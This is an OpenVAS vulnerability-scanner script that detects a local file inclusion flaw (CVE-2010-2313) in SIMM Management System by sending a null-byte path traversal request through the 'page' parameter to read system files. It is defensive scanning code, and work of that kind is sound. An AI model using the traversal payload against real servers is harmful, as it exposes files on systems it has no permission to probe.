###############################################################################
# OpenVAS Vulnerability Test
#
# SIMM Management System 'page' Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901127");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-06-22 14:43:46 +0200 (Tue, 22 Jun 2010)");
  script_cve_id("CVE-2010-2313");
  script_bugtraq_id(40543);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("SIMM Management System 'page' Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/40009");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/59063");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12848/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process.");

  script_tag(name:"affected", value:"Anodyne Productions SIMM Management System Version 2.6.10");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  via the 'page' parameter to 'index.php' when magic_quotes_gpc is disabled,
  that allows remote attackers to view files and execute local scripts in the context of the webserver.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running SIMM Management System and is prone to
  local file inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/sms", "/SMS", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/index.php?page=main", port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  if( ('Powered by SMS 2' >< res) && ('>Anodyne Productions<' >< res) )
  {
    files = traversal_files();
    foreach pattern (keys(files))
    {
      file = files[pattern];
      url = string (dir,"/index.php?page=../../../../../../../../../../../../../../../",file,"%00");
      if(http_vuln_check(port:port, url:file, pattern:pattern))
      {
        report = http_report_vuln_url(port: port, url: url);
        security_message(data:report, port:port);
        exit(0);
      }
    }
  }
}

exit(99);
